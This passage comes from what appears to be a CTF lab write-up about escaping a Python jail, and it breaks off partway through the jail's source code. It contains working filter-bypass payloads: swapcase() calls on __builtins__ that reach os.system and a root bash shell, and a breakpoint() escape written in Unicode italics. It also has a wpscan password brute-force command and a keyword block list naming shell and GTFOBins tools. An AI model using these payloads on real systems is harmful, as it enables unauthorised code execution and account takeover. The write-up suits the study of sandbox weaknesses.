</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=kn>import</span>
</span></span><span class=line><span class=cl><span class=nn>Illegal</span> <span class=n>Input</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>hello</span>
</span></span><span class=line><span class=cl><span class=n>Wrong</span> <span class=n>Input</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;hello&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>hello</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>Illegal</span> <span class=n>Input</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>BASH</span>
</span></span><span class=line><span class=cl><span class=n>Wrong</span> <span class=n>Input</span>
</span></span></code></pre></div><p>Seems like the code is filtering certain functions like <code>eval</code>, <code>exec</code>, <code>&lt;SPACE></code>, etc,. and UNIX commands like <code>bash</code>.</p><h3 id=python-jailbreak>Python JailBreak</h3><p>Resources to read: <a href=https://anee.me/escaping-python-jails-849c65cf306e target=_blank rel=noopener>escaping-python-jails | Aneesh Dogra</a>
, <a href=https://docs.python.org/3/library/builtins.html target=_blank rel=noopener>builtins|Python</a>
, <a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#builtins target=_blank rel=noopener>Builtins|Hacktricks</a>
, <a href=https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md target=_blank rel=noopener>python-ctf-cheatsheet/pyjails</a>
,<a href=https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass target=_blank rel=noopener>pyjail-cheatsheet#unicode-bypass</a>
, <a href=https://lingojam.com/ItalicTextGenerator target=_blank rel=noopener>Intalic text Generator</a>
.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=n>__builtins__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>module</span> <span class=s1>&#39;builtins&#39;</span> <span class=p>(</span><span class=n>built</span><span class=o>-</span><span class=ow>in</span><span class=p>)</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=nb>dir</span><span class=p>(</span><span class=n>__builtins__</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=s1>&#39;ArithmeticError&#39;</span><span class=p>,</span> <span class=s1>&#39;AssertionError&#39;</span><span class=p>,</span> <span class=s1>&#39;AttributeError&#39;</span><span class=p>,</span> <span class=s1>&#39;BaseException&#39;</span><span class=p>,</span> <span class=s1>&#39;BlockingIOError&#39;</span><span class=p>,</span> <span class=s1>&#39;BrokenPipeError&#39;</span><span class=p>,</span> <span class=s1>&#39;BufferError&#39;</span><span class=p>,</span> <span class=s1>&#39;BytesWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;ChildProcessError&#39;</span><span class=p>,</span> <span class=s1>&#39;ConnectionAbortedError&#39;</span><span class=p>,</span> <span class=s1>&#39;ConnectionError&#39;</span><span class=p>,</span> <span class=s1>&#39;ConnectionRefusedError&#39;</span><span class=p>,</span> <span class=s1>&#39;ConnectionResetError&#39;</span><span class=p>,</span> <span class=s1>&#39;DeprecationWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;EOFError&#39;</span><span class=p>,</span> <span class=s1>&#39;Ellipsis&#39;</span><span class=p>,</span> <span class=s1>&#39;EnvironmentError&#39;</span><span class=p>,</span> <span class=s1>&#39;Exception&#39;</span><span class=p>,</span> <span class=s1>&#39;False&#39;</span><span class=p>,</span> <span class=s1>&#39;FileExistsError&#39;</span><span class=p>,</span> <span class=s1>&#39;FileNotFoundError&#39;</span><span class=p>,</span> <span class=s1>&#39;FloatingPointError&#39;</span><span class=p>,</span> <span class=s1>&#39;FutureWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;GeneratorExit&#39;</span><span class=p>,</span> <span class=s1>&#39;IOError&#39;</span><span class=p>,</span> <span class=s1>&#39;ImportError&#39;</span><span class=p>,</span> <span class=s1>&#39;ImportWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;IndentationError&#39;</span><span class=p>,</span> <span class=s1>&#39;IndexError&#39;</span><span class=p>,</span> <span class=s1>&#39;InterruptedError&#39;</span><span class=p>,</span> <span class=s1>&#39;IsADirectoryError&#39;</span><span class=p>,</span> <span class=s1>&#39;KeyError&#39;</span><span class=p>,</span> <span class=s1>&#39;KeyboardInterrupt&#39;</span><span class=p>,</span> <span class=s1>&#39;LookupError&#39;</span><span class=p>,</span> <span class=s1>&#39;MemoryError&#39;</span><span class=p>,</span> <span class=s1>&#39;ModuleNotFoundError&#39;</span><span class=p>,</span> <span class=s1>&#39;NameError&#39;</span><span class=p>,</span> <span class=s1>&#39;None&#39;</span><span class=p>,</span> <span class=s1>&#39;NotADirectoryError&#39;</span><span class=p>,</span> <span class=s1>&#39;NotImplemented&#39;</span><span class=p>,</span> <span class=s1>&#39;NotImplementedError&#39;</span><span class=p>,</span> <span class=s1>&#39;OSError&#39;</span><span class=p>,</span> <span class=s1>&#39;OverflowError&#39;</span><span class=p>,</span> <span class=s1>&#39;PendingDeprecationWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;PermissionError&#39;</span><span class=p>,</span> <span class=s1>&#39;ProcessLookupError&#39;</span><span class=p>,</span> <span class=s1>&#39;RecursionError&#39;</span><span class=p>,</span> <span class=s1>&#39;ReferenceError&#39;</span><span class=p>,</span> <span class=s1>&#39;ResourceWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;RuntimeError&#39;</span><span class=p>,</span> <span class=s1>&#39;RuntimeWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;StopAsyncIteration&#39;</span><span class=p>,</span> <span class=s1>&#39;StopIteration&#39;</span><span class=p>,</span> <span class=s1>&#39;SyntaxError&#39;</span><span class=p>,</span> <span class=s1>&#39;SyntaxWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;SystemError&#39;</span><span class=p>,</span> <span class=s1>&#39;SystemExit&#39;</span><span class=p>,</span> <span class=s1>&#39;TabError&#39;</span><span class=p>,</span> <span class=s1>&#39;TimeoutError&#39;</span><span class=p>,</span> <span class=s1>&#39;True&#39;</span><span class=p>,</span> <span class=s1>&#39;TypeError&#39;</span><span class=p>,</span> <span class=s1>&#39;UnboundLocalError&#39;</span><span class=p>,</span> <span class=s1>&#39;UnicodeDecodeError&#39;</span><span class=p>,</span> <span class=s1>&#39;UnicodeEncodeError&#39;</span><span class=p>,</span> <span class=s1>&#39;UnicodeError&#39;</span><span class=p>,</span> <span class=s1>&#39;UnicodeTranslateError&#39;</span><span class=p>,</span> <span class=s1>&#39;UnicodeWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;UserWarning&#39;</span><span class=p>,</span> <span class=s1>&#39;ValueError&#39;</span><span class=p>,</span> <span class=s1>&#39;Warning&#39;</span><span class=p>,</span> <span class=s1>&#39;ZeroDivisionError&#39;</span><span class=p>,</span> <span class=s1>&#39;__build_class__&#39;</span><span class=p>,</span> <span class=s1>&#39;__debug__&#39;</span><span class=p>,</span> <span class=s1>&#39;__doc__&#39;</span><span class=p>,</span> <span class=s1>&#39;__import__&#39;</span><span class=p>,</span> <span class=s1>&#39;__loader__&#39;</span><span class=p>,</span> <span class=s1>&#39;__name__&#39;</span><span class=p>,</span> <span class=s1>&#39;__package__&#39;</span><span class=p>,</span> <span class=s1>&#39;__spec__&#39;</span><span class=p>,</span> <span class=s1>&#39;abs&#39;</span><span class=p>,</span> <span class=s1>&#39;all&#39;</span><span class=p>,</span> <span class=s1>&#39;any&#39;</span><span class=p>,</span> <span class=s1>&#39;ascii&#39;</span><span class=p>,</span> <span class=s1>&#39;bin&#39;</span><span class=p>,</span> <span class=s1>&#39;bool&#39;</span><span class=p>,</span> <span class=s1>&#39;breakpoint&#39;</span><span class=p>,</span> <span class=s1>&#39;bytearray&#39;</span><span class=p>,</span> <span class=s1>&#39;bytes&#39;</span><span class=p>,</span> <span class=s1>&#39;callable&#39;</span><span class=p>,</span> <span class=s1>&#39;chr&#39;</span><span class=p>,</span> <span class=s1>&#39;classmethod&#39;</span><span class=p>,</span> <span class=s1>&#39;compile&#39;</span><span class=p>,</span> <span class=s1>&#39;complex&#39;</span><span class=p>,</span> <span class=s1>&#39;copyright&#39;</span><span class=p>,</span> <span class=s1>&#39;credits&#39;</span><span class=p>,</span> <span class=s1>&#39;delattr&#39;</span><span class=p>,</span> <span class=s1>&#39;dict&#39;</span><span class=p>,</span> <span class=s1>&#39;dir&#39;</span><span class=p>,</span> <span class=s1>&#39;divmod&#39;</span><span class=p>,</span> <span class=s1>&#39;enumerate&#39;</span><span class=p>,</span> <span class=s1>&#39;eval&#39;</span><span class=p>,</span> <span class=s1>&#39;exec&#39;</span><span class=p>,</span> <span class=s1>&#39;exit&#39;</span><span class=p>,</span> <span class=s1>&#39;filter&#39;</span><span class=p>,</span> <span class=s1>&#39;float&#39;</span><span class=p>,</span> <span class=s1>&#39;format&#39;</span><span class=p>,</span> <span class=s1>&#39;frozenset&#39;</span><span class=p>,</span> <span class=s1>&#39;getattr&#39;</span><span class=p>,</span> <span class=s1>&#39;globals&#39;</span><span class=p>,</span> <span class=s1>&#39;hasattr&#39;</span><span class=p>,</span> <span class=s1>&#39;hash&#39;</span><span class=p>,</span> <span class=s1>&#39;help&#39;</span><span class=p>,</span> <span class=s1>&#39;hex&#39;</span><span class=p>,</span> <span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=s1>&#39;input&#39;</span><span class=p>,</span> <span class=s1>&#39;int&#39;</span><span class=p>,</span> <span class=s1>&#39;isinstance&#39;</span><span class=p>,</span> <span class=s1>&#39;issubclass&#39;</span><span class=p>,</span> <span class=s1>&#39;iter&#39;</span><span class=p>,</span> <span class=s1>&#39;len&#39;</span><span class=p>,</span> <span class=s1>&#39;license&#39;</span><span class=p>,</span> <span class=s1>&#39;list&#39;</span><span class=p>,</span> <span class=s1>&#39;locals&#39;</span><span class=p>,</span> <span class=s1>&#39;map&#39;</span><span class=p>,</span> <span class=s1>&#39;max&#39;</span><span class=p>,</span> <span class=s1>&#39;memoryview&#39;</span><span class=p>,</span> <span class=s1>&#39;min&#39;</span><span class=p>,</span> <span class=s1>&#39;next&#39;</span><span class=p>,</span> <span class=s1>&#39;object&#39;</span><span class=p>,</span> <span class=s1>&#39;oct&#39;</span><span class=p>,</span> <span class=s1>&#39;open&#39;</span><span class=p>,</span> <span class=s1>&#39;ord&#39;</span><span class=p>,</span> <span class=s1>&#39;pow&#39;</span><span class=p>,</span> <span class=s1>&#39;print&#39;</span><span class=p>,</span> <span class=s1>&#39;property&#39;</span><span class=p>,</span> <span class=s1>&#39;quit&#39;</span><span class=p>,</span> <span class=s1>&#39;range&#39;</span><span class=p>,</span> <span class=s1>&#39;repr&#39;</span><span class=p>,</span> <span class=s1>&#39;reversed&#39;</span><span class=p>,</span> <span class=s1>&#39;round&#39;</span><span class=p>,</span> <span class=s1>&#39;set&#39;</span><span class=p>,</span> <span class=s1>&#39;setattr&#39;</span><span class=p>,</span> <span class=s1>&#39;slice&#39;</span><span class=p>,</span> <span class=s1>&#39;sorted&#39;</span><span class=p>,</span> <span class=s1>&#39;staticmethod&#39;</span><span class=p>,</span> <span class=s1>&#39;str&#39;</span><span class=p>,</span> <span class=s1>&#39;sum&#39;</span><span class=p>,</span> <span class=s1>&#39;super&#39;</span><span class=p>,</span> <span class=s1>&#39;tuple&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>,</span> <span class=s1>&#39;vars&#39;</span><span class=p>,</span> <span class=s1>&#39;zip&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=nb>dir</span><span class=p>(</span><span class=n>__builtins__</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=s1>&#39;__class__&#39;</span><span class=p>,</span> <span class=s1>&#39;__class_getitem__&#39;</span><span class=p>,</span> <span class=s1>&#39;__contains__&#39;</span><span class=p>,</span> <span class=s1>&#39;__delattr__&#39;</span><span class=p>,</span> <span class=s1>&#39;__delitem__&#39;</span><span class=p>,</span> <span class=s1>&#39;__dir__&#39;</span><span class=p>,</span> <span class=s1>&#39;__doc__&#39;</span><span class=p>,</span> <span class=s1>&#39;__eq__&#39;</span><span class=p>,</span> <span class=s1>&#39;__format__&#39;</span><span class=p>,</span> <span class=s1>&#39;__ge__&#39;</span><span class=p>,</span> <span class=s1>&#39;__getattribute__&#39;</span><span class=p>,</span> <span class=s1>&#39;__getitem__&#39;</span><span class=p>,</span> <span class=s1>&#39;__gt__&#39;</span><span class=p>,</span> <span class=s1>&#39;__hash__&#39;</span><span class=p>,</span> <span class=s1>&#39;__init__&#39;</span><span class=p>,</span> <span class=s1>&#39;__init_subclass__&#39;</span><span class=p>,</span> <span class=s1>&#39;__ior__&#39;</span><span class=p>,</span> <span class=s1>&#39;__iter__&#39;</span><span class=p>,</span> <span class=s1>&#39;__le__&#39;</span><span class=p>,</span> <span class=s1>&#39;__len__&#39;</span><span class=p>,</span> <span class=s1>&#39;__lt__&#39;</span><span class=p>,</span> <span class=s1>&#39;__ne__&#39;</span><span class=p>,</span> <span class=s1>&#39;__new__&#39;</span><span class=p>,</span> <span class=s1>&#39;__or__&#39;</span><span class=p>,</span> <span class=s1>&#39;__reduce__&#39;</span><span class=p>,</span> <span class=s1>&#39;__reduce_ex__&#39;</span><span class=p>,</span> <span class=s1>&#39;__repr__&#39;</span><span class=p>,</span> <span class=s1>&#39;__reversed__&#39;</span><span class=p>,</span> <span class=s1>&#39;__ror__&#39;</span><span class=p>,</span> <span class=s1>&#39;__setattr__&#39;</span><span class=p>,</span> <span class=s1>&#39;__setitem__&#39;</span><span class=p>,</span> <span class=s1>&#39;__sizeof__&#39;</span><span class=p>,</span> <span class=s1>&#39;__str__&#39;</span><span class=p>,</span> <span class=s1>&#39;__subclasshook__&#39;</span><span class=p>,</span> <span class=s1>&#39;clear&#39;</span><span class=p>,</span> <span class=s1>&#39;copy&#39;</span><span class=p>,</span> <span class=s1>&#39;fromkeys&#39;</span><span class=p>,</span> <span class=s1>&#39;get&#39;</span><span class=p>,</span> <span class=s1>&#39;items&#39;</span><span class=p>,</span> <span class=s1>&#39;keys&#39;</span><span class=p>,</span> <span class=s1>&#39;pop&#39;</span><span class=p>,</span> <span class=s1>&#39;popitem&#39;</span><span class=p>,</span> <span class=s1>&#39;setdefault&#39;</span><span class=p>,</span> <span class=s1>&#39;update&#39;</span><span class=p>,</span> <span class=s1>&#39;values&#39;</span><span class=p>]</span><span class=mi>0</span>
</span></span></code></pre></div><p><code>__builtins__</code> working fine for us, lets investigate how to use this further.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>__builtins__</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;__IMPORT__&#39;</span><span class=o>.</span><span class=n>lower</span><span class=p>()](</span><span class=s1>&#39;OS&#39;</span><span class=o>.</span><span class=n>lower</span><span class=p>())</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;SYSTEM&#39;</span><span class=o>.</span><span class=n>lower</span><span class=p>()](</span><span class=s1>&#39;ls&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>We can use the above command to list the files in root directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>__builtins__</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;__IMPORT__&#39;</span><span class=o>.</span><span class=n>lower</span><span class=p>()](</span><span class=s1>&#39;OS&#39;</span><span class=o>.</span><span class=n>lower</span><span class=p>())</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;SYSTEM&#39;</span><span class=o>.</span><span class=n>lower</span><span class=p>()](</span><span class=s1>&#39;ls&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Illegal</span> <span class=n>Input</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>__IMPORT__</span>                                                                                       
</span></span><span class=line><span class=cl><span class=n>Wrong</span> <span class=n>Input</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>lower</span>
</span></span><span class=line><span class=cl><span class=n>Illegal</span> <span class=n>Input</span>
</span></span></code></pre></div><p>So, the error is from the <code>lower</code>. Lets use some other method to change its CASE.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>__builtins__</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;__IMPORT__&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>()](</span><span class=s1>&#39;OS&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>())</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;SYSTEM&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>()](</span><span class=s1>&#39;ls&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>readfile</span>  <span class=n>readfile</span><span class=o>.</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>__builtins__</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;__IMPORT__&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>()](</span><span class=s1>&#39;OS&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>())</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;SYSTEM&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>()](</span><span class=s1>&#39;id&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span>
</span></span></code></pre></div><p>By changing <code>.lower()</code> to <code>.swapcase()</code> we are able to execute the command as root user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>__builtins__</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;__IMPORT__&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>()](</span><span class=s1>&#39;OS&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>())</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;SYSTEM&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>()](</span><span class=s1>&#39;BASH&#39;</span><span class=o>.</span><span class=n>swapcase</span><span class=p>())</span>
</span></span></code></pre></div><p>We got the shell as <code>root user</code> here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /root/.root.txt
</span></span><span class=line><span class=cl>flag3 REDACTED
</span></span></code></pre></div><p>We got our last flag here.</p><h2 id=alternatives>Alternatives</h2><h3 id=username-and-password-enumaration-using-wpscan>Username and Password enumaration using wpscan</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wpscan --url http://10.10.158.39/wordpress -e u --passwords /usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><h3 id=python-jailbreak-using-ùò£ùò≥ùò¶ùò¢ùò¨ùò±ùò∞ùò™ùòØùòµ>Python JailBreak using ùò£ùò≥ùò¶ùò¢ùò¨ùò±ùò∞ùò™ùòØùòµ()</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>ùò£ùò≥ùò¶ùò¢ùò¨ùò±ùò∞ùò™ùòØùòµ</span><span class=p>()</span>
</span></span></code></pre></div><p>Need to run the above command in python jail. Now calling <code>import os;os.system("/bin/sh")</code> will gives us a shell as root user.</p><p>The source suggested a potential solution to escape Python jails: using the <code>breakpoint()</code> function. This built-in Python function, introduced in Python 3.7, allows developers to pause the execution of their code and enter an interactive debugging session. In the context of Python jail escapes, where the goal is to break out of restricted Python environments, <code>breakpoint()</code> could be used to gain access to the sandbox&rsquo;s internals, file system, or sensitive variables through interactive debugging.
Read also : <a href=https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md#no-ascii-letters target=_blank rel=noopener>pyjails#no-ascii-letters</a>
, <a href=https://peps.python.org/pep-0672/ target=_blank rel=noopener>Unicode-related Security Considerations for Python</a>
and <a href=https://lingojam.com/ItalicTextGenerator target=_blank rel=noopener>Intalic text Generator</a>
.</p><h2 id=extras>Extras</h2><h3 id=jailpy>jail.py</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># jail.py</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malicious</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Illegal Input&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>text</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;&gt;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Exiting...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>keyword</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;#&#39;</span><span class=p>,</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;}&#39;</span><span class=p>,</span><span class=s1>&#39;`&#39;</span><span class=p>,</span><span class=s1>&#39;&#34;&#39;</span><span class=p>,</span><span class=s1>&#39;class&#39;</span><span class=p>,</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=s1>&#39;breakpoint&#39;</span><span class=p>,</span><span class=s1>&#39;eval&#39;</span><span class=p>,</span> <span class=s1>&#39;exec&#39;</span><span class=p>,</span> <span class=s1>&#39;import&#39;</span><span class=p>,</span> <span class=s1>&#39;open&#39;</span><span class=p>,</span> <span class=s1>&#39;os&#39;</span><span class=p>,</span> <span class=s1>&#39;read&#39;</span><span class=p>,</span> <span class=s1>&#39;system&#39;</span><span class=p>,</span> <span class=s1>&#39;write&#39;</span><span class=p>,</span> <span class=s1>&#39;lower&#39;</span><span class=p>,</span><span class=s1>&#39;class&#39;</span><span class=p>,</span><span class=s1>&#39;init&#39;</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;+&#39;</span><span class=p>,</span><span class=s1>&#39;‚Äò&#39;</span><span class=p>,</span><span class=s1>&#39;readlines&#39;</span><span class=p>,</span><span class=s1>&#39;bash&#39;</span><span class=p>,</span><span class=s1>&#39;sh&#39;</span><span class=p>,</span><span class=s1>&#39;7z&#39;</span><span class=p>,</span> <span class=s1>&#39;aa-exec&#39;</span><span class=p>,</span> <span class=s1>&#39;ab&#39;</span><span class=p>,</span> <span class=s1>&#39;agetty&#39;</span><span class=p>,</span> <span class=s1>&#39;alpine&#39;</span><span class=p>,</span> <span class=s1>&#39;ansible-playbook&#39;</span><span class=p>,</span> <span class=s1>&#39;ansible-test&#39;</span><span class=p>,</span> <span class=s1>&#39;aoss&#39;</span><span class=p>,</span> <span class=s1>&#39;apt-get&#39;</span><span class=p>,</span> <span class=s1>&#39;apt&#39;</span><span class=p>,</span> <span class=s1>&#39;ar&#39;</span><span class=p>,</span> <span class=s1>&#39;aria2c&#39;</span><span class=p>,</span> <span class=s1>&#39;arj&#39;</span><span class=p>,</span> <span class=s1>&#39;arp&#39;</span><span class=p>,</span> <span class=s1>&#39;ascii-xfr&#39;</span><span class=p>,</span> <span class=s1>&#39;ascii85&#39;</span><span class=p>,</span> <span class=s1>&#39;ash&#39;</span><span class=p>,</span> <span class=s1>&#39;aspell&#39;</span><span class=p>,</span> <span class=s1>&#39;at&#39;</span><span class=p>,</span> <span class=s1>&#39;atobm&#39;</span><span class=p>,</span> <span class=s1>&#39;awk&#39;</span><span class=p>,</span> <span class=s1>&#39;aws&#39;</span><span class=p>,</span> <span class=s1>&#39;base32&#39;</span><span class=p>,</span> <span class=s1>&#39;base58&#39;</span><span class=p>,</span> <span class=s1>&#39;base64&#39;</span><span class=p>,</span> <span class=s1>&#39;basenc&#39;</span><span class=p>,</span> <span class=s1>&#39;basez&#39;</span><span class=p>,</span> <span class=s1>&#39;bash&#39;</span><span class=p>,</span> <span class=s1>&#39;batcat&#39;</span><span class=p>,</span> <span class=s1>&#39;bc&#39;</span><span class=p>,</span> <span class=s1>&#39;bconsole&#39;</span><span class=p>,</span> <span class=s1>&#39;bpftrace&#39;</span><span class=p>,</span> <span class=s1>&#39;bridge&#39;</span><span class=p>,</span> <span class=s1>&#39;bundle&#39;</span><span class=p>,</span> <span class=s1>&#39;bundler&#39;</span><span class=p>,</span> <span class=s1>&#39;busctl&#39;</span><span class=p>,</span> <span class=s1>&#39;busybox&#39;</span><span class=p>,</span> <span class=s1>&#39;byebug&#39;</span><span class=p>,</span> <span class=s1>&#39;bzip2&#39;</span><span class=p>,</span> <span class=s1>&#39;c89&#39;</span><span class=p>,</span> <span class=s1>&#39;c99&#39;</span><span class=p>,</span> <span class=s1>&#39;cabal&#39;</span><span class=p>,</span> <span class=s1>&#39;cancel&#39;</span><span class=p>,</span> <span class=s1>&#39;capsh&#39;</span><span class=p>,</span> <span class=s1>&#39;cat&#39;</span><span class=p>,</span> <span class=s1>&#39;cdist&#39;</span><span class=p>,</span> <span class=s1>&#39;certbot&#39;</span><span class=p>,</span> <span class=s1>&#39;check_by_ssh&#39;</span><span class=p>,</span> <span class=s1>&#39;check_cups&#39;</span><span class=p>,</span> <span class=s1>&#39;check_log&#39;</span><span class=p>,</span> <span class=s1>&#39;check_memory&#39;</span><span class=p>,</span> <span class=s1>&#39;check_raid&#39;</span><span class=p>,</span> <span class=s1>&#39;check_ssl_cert&#39;</span><span class=p>,</span> <span class=s1>&#39;check_statusfile&#39;</span><span class=p>,</span> <span class=s1>&#39;chmod&#39;</span><span class=p>,</span> <span class=s1>&#39;choom&#39;</span><span class=p>,</span> <span class=s1>&#39;chown&#39;</span><span class=p>,</span> <span class=s1>&#39;chroot&#39;</span><span class=p>,</span> <span class=s1>&#39;cmp&#39;</span><span class=p>,</span> <span class=s1>&#39;cobc&#39;</span><span class=p>,</span> <span class=s1>&#39;column&#39;</span><span class=p>,</span> <span class=s1>&#39;comm&#39;</span><span class=p>,</span> <span class=s1>&#39;composer&#39;</span><span class=p>,</span> <span class=s1>&#39;cowsay&#39;</span><span class=p>,</span> <span class=s1>&#39;cowthink&#39;</span><span class=p>,</span> <span class=s1>&#39;cp&#39;</span><span class=p>,</span> <span class=s1>&#39;cpan&#39;</span><span class=p>,</span> <span class=s1>&#39;cpio&#39;</span><span class=p>,</span> <span class=s1>&#39;cpulimit&#39;</span><span class=p>,</span> <span class=s1>&#39;crash&#39;</span><span class=p>,</span> <span class=s1>&#39;crontab&#39;</span><span class=p>,</span> <span class=s1>&#39;csh&#39;</span><span class=p>,</span> <span class=s1>&#39;csplit&#39;</span><span class=p>,</span> <span class=s1>&#39;csvtool&#39;</span><span class=p>,</span> <span class=s1>&#39;cupsfilter&#39;</span><span class=p>,</span> <span class=s1>&#39;curl&#39;</span><span class=p>,</span> <span class=s1>&#39;cut&#39;</span><span class=p>,</span> <span class=s1>&#39;dash&#39;</span><span class=p>,</span> <span class=s1>&#39;date&#39;</span><span class=p>,</span> <span class=s1>&#39;dd&#39;</span><span class=p>,</span> <span class=s1>&#39;debugfs&#39;</span><span class=p>,</span> <span class=s1>&#39;dialog&#39;</span><span class=p>,</span> <span class=s1>&#39;diff&#39;</span><span class=p>,</span> <span class=s1>&#39;dig&#39;</span><span class=p>,</span> <span class=s1>&#39;distcc&#39;</span><span class=p>,</span> <span class=s1>&#39;dmesg&#39;</span><span class=p>,</span> <span class=s1>&#39;dmidecode&#39;</span><span class=p>,</span> <span class=s1>&#39;dmsetup&#39;</span><span class=p>,</span> <span class=s1>&#39;dnf&#39;</span><span class=p>,</span> <span class=s1>&#39;docker&#39;</span><span class=p>,</span> <span class=s1>&#39;dos2unix&#39;</span><span class=p>,</span> <span class=s1>&#39;dosbox&#39;</span><span class=p>,</span> <span class=s1>&#39;dotnet&#39;</span><span class=p>,</span> <span class=s1>&#39;dpkg&#39;</span><span class=p>,</span> <span 